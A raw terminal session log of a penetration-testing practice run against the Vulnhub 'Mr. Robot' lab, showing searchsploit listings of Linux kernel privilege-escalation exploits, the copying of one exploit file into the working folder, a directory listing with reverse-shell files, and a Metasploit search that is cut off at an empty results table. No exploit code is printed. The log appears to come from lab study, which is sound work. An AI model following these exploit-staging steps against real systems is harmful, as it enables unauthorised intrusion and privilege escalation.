@@ -1,0 +1,1146 @@
+Script started on 2020-10-27 16:14:04-04:00 [TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="166" LINES="39"]
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# s[Ksearchspli[Koit 3.13.[K[K[K[K[Kl[Klinux 3.13
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                      |  Path
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Alienvault Open Source SIEM (OSSIM) < 4.7.0 - 'get_license' Remote Command Execution (Metasploit)                                   | [01;31m[Klinux[m[K/remote/42697.rb
+Alienvault Open Source SIEM (OSSIM) < 4.7.0 - av-centerd 'get_log_line()' Remote Code Execution                                     | [01;31m[Klinux[m[K/remote/33805.pl
+Alienvault Open Source SIEM (OSSIM) < 4.8.0 - 'get_file' Information Disclosure (Metasploit)                                        | [01;31m[Klinux[m[K/remote/42695.rb
+AppArmor securityfs < 4.8 - 'aa_fs_seq_hash_show' Reference Count Leak                                                              | [01;31m[Klinux[m[K/dos/40181.c
+CyberArk < 10 - Memory Disclosure                                                                                                   | [01;31m[Klinux[m[K/remote/44829.py
+CyberArk Password Vault < 9.7 / < 10 - Memory Disclosure                                                                            | [01;31m[Klinux[m[K/dos/44428.txt
+Dell EMC RecoverPoint < 5.1.2 - Local Root Command Execution                                                                        | [01;31m[Klinux[m[K/local/44920.txt
+Dell EMC RecoverPoint < 5.1.2 - Remote Root Command Execution                                                                       | [01;31m[Klinux[m[K/remote/44921.txt
+Dell EMC RecoverPoint boxmgmt CLI < 5.1.2 - Arbitrary File Read                                                                     | [01;31m[Klinux[m[K/local/44688.txt
+DenyAll WAF < 6.3.0 - Remote Code Execution (Metasploit)                                                                            | [01;31m[Klinux[m[K/webapps/42769.rb
+Exim < 4.86.2 - Local Privilege Escalation                                                                                          | [01;31m[Klinux[m[K/local/39549.txt
+Exim < 4.90.1 - 'base64d' Remote Code Execution                                                                                     | [01;31m[Klinux[m[K/remote/44571.py
+Gnome Web (Epiphany) < 3.28.2.1 - Denial of Service                                                                                 | [01;31m[Klinux[m[K/dos/44857.html
+id Software Solaris Quake II [01;31m[K3.13[m[K/3.14 / QuakeWorld 2.0/2.1 / Quake 1.9/[01;31m[K3.13[m[K/3.14 - Command Execution                               | [01;31m[Klinux[m[K/remote/19079.c
+Jfrog Artifactory < 4.16 - Arbitrary File Upload / Remote Command Execution                                                         | [01;31m[Klinux[m[K/webapps/44543.txt
+KDE libkhtml 3.5 < 4.2.0 - Unhandled HTML Parse Exception                                                                           | [01;31m[Klinux[m[K/dos/2954.html
+LibreOffice < 6.0.1 - '=WEBSERVICE' Remote Arbitrary File Disclosure                                                                | [01;31m[Klinux[m[K/remote/44022.md
+[01;31m[KLinux[m[K < 4.14.103 / < 4.19.25 - Out-of-Bounds Read and Write in SNMP NAT Module                                                      | [01;31m[Klinux[m[K/dos/46477.txt
+[01;31m[KLinux[m[K < 4.16.9 / < 4.14.41 - 4-byte Infoleak via Uninitialized Struct Field in compat adjtimex Syscall                              | [01;31m[Klinux[m[K/dos/44641.c
+[01;31m[KLinux[m[K < 4.20.14 - Virtual Address 0 is Mappable via Privileged write() to /proc/*/mem                                               | [01;31m[Klinux[m[K/dos/46502.txt
+[01;31m[KLinux[m[K Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation                                                           | solaris/local/15962.c
+[01;31m[KLinux[m[K Kernel 3.11 < 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_RCVBUFFORCE' Local Privilege Escalation                                          | [01;31m[Klinux[m[K/local/41995.c
+[01;31m[KLinux[m[K Kernel [01;31m[K3.13[m[K - SGID Privilege Escalation                                                                                       | [01;31m[Klinux[m[K/local/33824.c
+[01;31m[KLinux[m[K Kernel [01;31m[K3.13[m[K.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                | [01;31m[Klinux[m[K/local/37292.c
+[01;31m[KLinux[m[K Kernel [01;31m[K3.13[m[K.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)           | [01;31m[Klinux[m[K/local/37293.txt
+[01;31m[KLinux[m[K Kernel [01;31m[K3.13[m[K.1 - 'Recvmmsg' Local Privilege Escalation (Metasploit)                                                            | [01;31m[Klinux[m[K/local/40503.rb
+[01;31m[KLinux[m[K Kernel [01;31m[K3.13[m[K/3.14 (Ubuntu) - 'splice()' System Call Local Denial of Service                                                    | [01;31m[Klinux[m[K/dos/36743.c
+[01;31m[KLinux[m[K Kernel 3.14-rc1 < 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Privilege Escalation                                      | [01;31m[Klinux[m[K_x86-64/local/33516.c
+[01;31m[KLinux[m[K Kernel 3.4 < [01;31m[K3.13[m[K.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X32=y' Local Privilege Escalation (3)                              | [01;31m[Klinux[m[K_x86-64/local/31347.c
+[01;31m[KLinux[m[K Kernel 3.4 < [01;31m[K3.13[m[K.2 (Ubuntu 13.10) - 'CONFIG_X86_X32' Arbitrary Write (2)                                                     | [01;31m[Klinux[m[K/local/31346.c
+[01;31m[KLinux[m[K Kernel 3.4 < [01;31m[K3.13[m[K.2 - recvmmsg x32 compat (PoC)                                                                               | [01;31m[Klinux[m[K/dos/31305.c
+[01;31m[KLinux[m[K Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                                                                | [01;31m[Klinux[m[K/dos/43234.c
+[01;31m[KLinux[m[K Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                                                                          | [01;31m[Klinux[m[K/local/41886.c
+[01;31m[KLinux[m[K Kernel < 3.16.1 - 'Remount FUSE' Local Privilege Escalation                                                                   | [01;31m[Klinux[m[K/local/34923.c
+[01;31m[KLinux[m[K Kernel < 3.16.39 (Debian 8 x64) - 'inotfiy' Local Privilege Escalation                                                        | [01;31m[Klinux[m[K/local/44302.c
+[01;31m[KLinux[m[K Kernel < 4.10.13 - 'keyctl_set_reqkey_keyring' Local Denial of Service                                                        | [01;31m[Klinux[m[K/dos/42136.c
+[01;31m[KLinux[m[K kernel < 4.10.15 - Race Condition Privilege Escalation                                                                        | [01;31m[Klinux[m[K/local/43345.c
+[01;31m[KLinux[m[K Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege Escalation                                                   | [01;31m[Klinux[m[K/local/45553.c
+[01;31m[KLinux[m[K Kernel < 4.13.1 - BlueTooth Buffer Overflow (PoC)                                                                             | [01;31m[Klinux[m[K/dos/42762.txt
+[01;31m[KLinux[m[K Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                       | [01;31m[Klinux[m[K/local/45010.c
+[01;31m[KLinux[m[K Kernel < 4.14.rc3 - Local Denial of Service                                                                                   | [01;31m[Klinux[m[K/dos/42932.c
+[01;31m[KLinux[m[K Kernel < 4.15.4 - 'show_floppy' KASLR Address Leak                                                                            | [01;31m[Klinux[m[K/local/44325.c
+[01;31m[KLinux[m[K Kernel < 4.16.11 - 'ext4_read_inline_data()' Memory Corruption                                                                | [01;31m[Klinux[m[K/dos/44832.txt
+[01;31m[KLinux[m[K Kernel < 4.17-rc1 - 'AF_LLC' Double Free                                                                                      | [01;31m[Klinux[m[K/dos/44579.c
+[01;31m[KLinux[m[K Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                              | [01;31m[Klinux[m[K/local/44298.c
+[01;31m[KLinux[m[K Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                   | [01;31m[Klinux[m[K/local/44300.c
+[01;31m[KLinux[m[K Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                               | [01;31m[Klinux[m[K/local/43418.c
+[01;31m[KLinux[m[K Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / [01;31m[KLinux[m[K Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)           | [01;31m[Klinux[m[K/local/47169.c
+[01;31m[KLinux[m[K Kernel < 4.5.1 - Off-By-One (PoC)                                                                                             | [01;31m[Klinux[m[K/dos/44301.c
+Logpoint < 5.6.4 - Root Remote Code Execution                                                                                       | [01;31m[Klinux[m[K/remote/42158.py
+MatrixSSL < 4.0.2 - Stack Buffer Overflow Verifying x.509 Certificates                                                              | [01;31m[Klinux[m[K/dos/46435.txt
+Nagios < 4.2.2 - Arbitrary Code Execution                                                                                           | [01;31m[Klinux[m[K/remote/40920.py
+Nagios < 4.2.4 - Local Privilege Escalation                                                                                         | [01;31m[Klinux[m[K/local/40921.sh
+NfSen < 1.3.7 / AlienVault OSSIM < 5.3.6 - Local Privilege Escalation                                                               | [01;31m[Klinux[m[K/local/42305.txt
+OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                            | [01;31m[Klinux[m[K/remote/45233.py
+OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                                      | [01;31m[Klinux[m[K/remote/45210.py
+OpenSSH < 6.6 SFTP (x64) - Command Execution                                                                                        | [01;31m[Klinux[m[K_x86-64/remote/45000.c
+OpenSSH < 6.6 SFTP - Command Execution                                                                                              | [01;31m[Klinux[m[K/remote/45001.py
+OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                                | [01;31m[Klinux[m[K/local/40962.txt
+OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                            | [01;31m[Klinux[m[K/remote/40963.txt
+OpenSSH < 7.7 - User Enumeration (2)                                                                                                | [01;31m[Klinux[m[K/remote/45939.py
+Oracle MySQL < 5.1.49 - 'DDL' Statements Denial of Service                                                                          | [01;31m[Klinux[m[K/dos/34522.txt
+Oracle MySQL < 5.1.49 - Malformed 'BINLOG' Arguments Denial of Service                                                              | [01;31m[Klinux[m[K/dos/34521.txt
+Oracle VM VirtualBox < 5.0.32 / < 5.1.14 - Local Privilege Escalation                                                               | [01;31m[Klinux[m[K/local/41196.txt
+Oracle WebCenter FatWire Content Server < 7 - Improper Access Control                                                               | [01;31m[Klinux[m[K/webapps/44757.txt
+pam-krb5 < [01;31m[K3.13[m[K - Local Privilege Escalation                                                                                        | [01;31m[Klinux[m[K/local/8303.c
+PHP < 4.4.5/5.2.1 - 'shmop' Local Code Execution                                                                                    | [01;31m[Klinux[m[K/local/3426.php
+PHP < 4.4.5/5.2.1 - 'shmop' SSL RSA Private-Key Disclosure                                                                          | [01;31m[Klinux[m[K/local/3427.php
+PHP < 4.4.5/5.2.1 - '_SESSION unset()' Local Overflow                                                                               | [01;31m[Klinux[m[K/local/3571.php
+PHP < 4.4.5/5.2.1 - '_SESSION' Deserialization Overwrite                                                                            | [01;31m[Klinux[m[K/local/3572.php
+Pi-hole < 4.4 - Authenticated Remote Code Execution                                                                                 | [01;31m[Klinux[m[K/webapps/48442.py
+Pi-hole < 4.4 - Authenticated Remote Code Execution / Privileges Escalation                                                         | [01;31m[Klinux[m[K/webapps/48443.py
+Redis-cli < 5.0 - Buffer Overflow (PoC)                                                                                             | [01;31m[Klinux[m[K/local/44904.py
+RPi Cam Control < 6.4.25 - 'preview.php' Remote Command Execution                                                                   | [01;31m[Klinux[m[K/webapps/45361.py
+runc < 1.0-rc6 (Docker < 18.09.2) - Container Breakout (1)                                                                          | [01;31m[Klinux[m[K/local/46359.md
+runc < 1.0-rc6 (Docker < 18.09.2) - Container Breakout (2)                                                                          | [01;31m[Klinux[m[K/local/46369.md
+Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' Arbitrary Module Load (Metasploit)                                        | [01;31m[Klinux[m[K/remote/42084.rb
+SAP B2B / B2C CRM 2.x < 4.x - Local File Inclusion                                                                                  | [01;31m[Klinux[m[K/webapps/44655.txt
+Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (1)                                                                         | [01;31m[Klinux[m[K/local/47009.c
+SixApart MovableType < 5.2.12 - Storable Perl Code Execution (Metasploit)                                                           | [01;31m[Klinux[m[K/webapps/41697.rb
+Splunk < 7.0.1 - Information Disclosure                                                                                             | [01;31m[Klinux[m[K/webapps/44865.txt
+systemd (systemd-tmpfiles) < 236 - 'fs.protected_hardlinks=0' Local Privilege Escalation                                            | [01;31m[Klinux[m[K/local/43935.txt
+Tenable Appliance < 4.5 - Root Remote Code Execution                                                                                | [01;31m[Klinux[m[K/remote/41892.sh
+Ubuntu < 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                                              | [01;31m[Klinux[m[K/local/41760.txt
+UCOPIA Wireless Appliance < 5.1 (Captive Portal) - Root Remote Code Execution                                                       | [01;31m[Klinux[m[K/remote/42949.txt
+UCOPIA Wireless Appliance < 5.1.8 - Local Privilege Escalation                                                                      | [01;31m[Klinux[m[K/local/42936.md
+UCOPIA Wireless Appliance < 5.1.8 - Restricted Shell Escape                                                                         | [01;31m[Klinux[m[K/local/42937.md
+Vim < 8.1.1365 / Neovim < 0.3.6 - Arbitrary Code Execution                                                                          | [01;31m[Klinux[m[K/local/46973.md
+Virtualmin < 3.703 - Multiple Local/Remote Vulnerabilities                                                                          | [01;31m[Klinux[m[K/remote/9143.txt
+WordPress Core < 4.7.4 - Unauthorized Password Reset                                                                                | [01;31m[Klinux[m[K/webapps/41963.txt
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# searchsploit linux 3.13[C 3.13k 3.13e 3.13r 3.13n 3.13e 3.13l 3.13
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                      |  Path
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation                                                           | solaris/local/15962.c
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K 3.11 < 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_RCVBUFFORCE' Local Privilege Escalation                                          | [01;31m[Klinux[m[K/local/41995.c
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K [01;31m[K3.13[m[K - SGID Privilege Escalation                                                                                       | [01;31m[Klinux[m[K/local/33824.c
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K [01;31m[K3.13[m[K.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                | [01;31m[Klinux[m[K/local/37292.c
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K [01;31m[K3.13[m[K.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)           | [01;31m[Klinux[m[K/local/37293.txt
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K [01;31m[K3.13[m[K.1 - 'Recvmmsg' Local Privilege Escalation (Metasploit)                                                            | [01;31m[Klinux[m[K/local/40503.rb
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K [01;31m[K3.13[m[K/3.14 (Ubuntu) - 'splice()' System Call Local Denial of Service                                                    | [01;31m[Klinux[m[K/dos/36743.c
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K 3.14-rc1 < 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Privilege Escalation                                      | [01;31m[Klinux[m[K_x86-64/local/33516.c
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K 3.4 < [01;31m[K3.13[m[K.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X32=y' Local Privilege Escalation (3)                              | [01;31m[Klinux[m[K_x86-64/local/31347.c
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K 3.4 < [01;31m[K3.13[m[K.2 (Ubuntu 13.10) - 'CONFIG_X86_X32' Arbitrary Write (2)                                                     | [01;31m[Klinux[m[K/local/31346.c
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K 3.4 < [01;31m[K3.13[m[K.2 - recvmmsg x32 compat (PoC)                                                                               | [01;31m[Klinux[m[K/dos/31305.c
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                                                                | [01;31m[Klinux[m[K/dos/43234.c
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K 4.8.0 UDEV < 232 - Local Privilege Escalation                                                                          | [01;31m[Klinux[m[K/local/41886.c
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K < 3.16.1 - 'Remount FUSE' Local Privilege Escalation                                                                   | [01;31m[Klinux[m[K/local/34923.c
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K < 3.16.39 (Debian 8 x64) - 'inotfiy' Local Privilege Escalation                                                        | [01;31m[Klinux[m[K/local/44302.c
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K < 4.10.13 - 'keyctl_set_reqkey_keyring' Local Denial of Service                                                        | [01;31m[Klinux[m[K/dos/42136.c
+[01;31m[KLinux[m[K [01;31m[Kkernel[m[K < 4.10.15 - Race Condition Privilege Escalation                                                                        | [01;31m[Klinux[m[K/local/43345.c
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege Escalation                                                   | [01;31m[Klinux[m[K/local/45553.c
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K < 4.13.1 - BlueTooth Buffer Overflow (PoC)                                                                             | [01;31m[Klinux[m[K/dos/42762.txt
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                       | [01;31m[Klinux[m[K/local/45010.c
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K < 4.14.rc3 - Local Denial of Service                                                                                   | [01;31m[Klinux[m[K/dos/42932.c
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K < 4.15.4 - 'show_floppy' KASLR Address Leak                                                                            | [01;31m[Klinux[m[K/local/44325.c
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K < 4.16.11 - 'ext4_read_inline_data()' Memory Corruption                                                                | [01;31m[Klinux[m[K/dos/44832.txt
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K < 4.17-rc1 - 'AF_LLC' Double Free                                                                                      | [01;31m[Klinux[m[K/dos/44579.c
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                              | [01;31m[Klinux[m[K/local/44298.c
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                   | [01;31m[Klinux[m[K/local/44300.c
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                               | [01;31m[Klinux[m[K/local/43418.c
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / [01;31m[KLinux[m[K Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)           | [01;31m[Klinux[m[K/local/47169.c
+[01;31m[KLinux[m[K [01;31m[KKernel[m[K < 4.5.1 - Off-By-One (PoC)                                                                                             | [01;31m[Klinux[m[K/dos/44301.c
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# locate linux/local/33824.c
+/usr/share/exploitdb/exploits/linux/local/33824.c
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# cp /usr/share/exploitdb/exploits/linux/local/33824.c
+cp: missing destination file operand after '/usr/share/exploitdb/exploits/linux/local/33824.c'
+Try 'cp --help' for more information.
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# cp /usr/share/exploitdb/exploits/linux/local/33824.c .
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# ls
+33824.c                             dirb-2       hydra           mrrobot2.txt  nmap       [0m[01;34mphp-reverse-shell[0m            usuario.txt  wpshell.php
+bf-wpscan                           discover     hydra.restore   mrrobot.txt   nmap-2     [01;35mreverse-shell-wordpress.png[0m  wpscan       wpxpl
+[01;35mburp-suite_wp-login_parametros.png[0m  fsocity.dic  key-1-of-3.txt  nikto         nmap-3     robots.txt                   wpscan-2
+dirb                                hash         license         nikto-2       notes.txt  searchsploit                 wpscan-3
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# msfconsole
+[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../                                                  
+[0m[36m[0m
+[35m     .~+P``````-o+:.                                      -o+:.[0m
+[35m.+oooyysyyssyyssyddh++os-`````                        ```````````````          `[0m
+[35m+++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o[0m
+[35m++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy[0m
+[35m--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///[0m
+[35m                                `...............`              `...-/////...`[0m
+[0m
+[0m
+[37m                                  .::::::::::-.                     .::::::-[0m
+[37m                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo[0m
+[37m                                 :Nm-/NMMMMMMMMMMMMM[34m$$[37mNMMMMm[34m&&[37mMMMMMMMMMMMMMMy[0m
+[37m                                 .sm/`-yMMMMMMMMMMMM[34m$$[37mMMMMMN[34m&&[37mMMMMMMMMMMMMMh`[0m
+[37m                                  -Nd`  :MMMMMMMMMMM[34m$$[37mMMMMMN[34m&&[37mMMMMMMMMMMMMh`[0m
+[37m                                   -Nh` .yMMMMMMMMMM[34m$$[37mMMMMMN[34m&&[37mMMMMMMMMMMMm/[0m
+[37m    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM[34m$$[37mMMMMMN[34m&&[37mMMMMMMMMMMm/[0m
+[37m      .yNmMMh[2;31m//[37m+syysso-``````       -mh` :MMMMMMMMMM[34m$$[37mMMMMMN[34m&&[37mMMMMMMMMMMd[0m
+[37m    .shMMMMN[2;31m//[37mdmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/[0m
+[37m    `///omh[2;31m//[37mdMMMMMMMMMMMMMMMN/[2;31m:::::/+ooso--/ydh//+s+/ossssso:--syN///os:[0m
+[37m          /MMMMMMMMMMMMMMMMMMd.     [2;31m`/++-.-yy/[37m...[2;31mosydh/-+oo:-`o//[37m...[2;31moyodh+[0m
+[37m          -hMMmssddd+:dMMmNMMh.     [2;31m`.-=mmk.[37m//^^^\\[2;31m.^^`:++:^^o:[37m//^^^\\[2;31m`::[0m
+[37m          .sMMmo.    -dMd--:mN/`           [37m||--X--||[0m          [2;31m[37m||--X--||[0m
+[37m........../yddy/:...+hmo-...hdd:............[37m\\=v=//[0m............[2;31m[37m\\=v=//[0m.........
+[32m================================================================================[0m
+[32m=====================[37m+--------------------------------+[32m=========================[0m
+[32m=====================[37m| Session one died of dysentery. |[32m=========================[0m
+[32m=====================[37m+--------------------------------+[32m=========================[0m
+[32m================================================================================[0m
+[0m
+[0m                     [32mPress ENTER to size up the situation[0m
+[0m
+[37m%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%[0m
+[37m%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%[0m
+[37m%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%[0m
+[37m%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%[0m
+[37m%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%[0m
+[37m%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%[0m
+[37m%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%[0m
+[0m
+[0m                        [37mPress SPACE BAR to continue[0m
+[0m
+[0m
+
+       =[ [33mmetasploit v5.0.99-dev[0m                          ]
++ -- --=[ 2045 exploits - 1106 auxiliary - 344 post       ]
++ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: View all productivity tips with the [32mtips[0m command
+
+[?1034h[4mmsf5[0m [0m> search linux kernel 3.13
+[0m
+Matching Modules
+================
+
+   #    Name                                                                      Disclosure Date  Rank       Check  Description
+   -    ----                                                                      ---------------  ----       -----  -----------
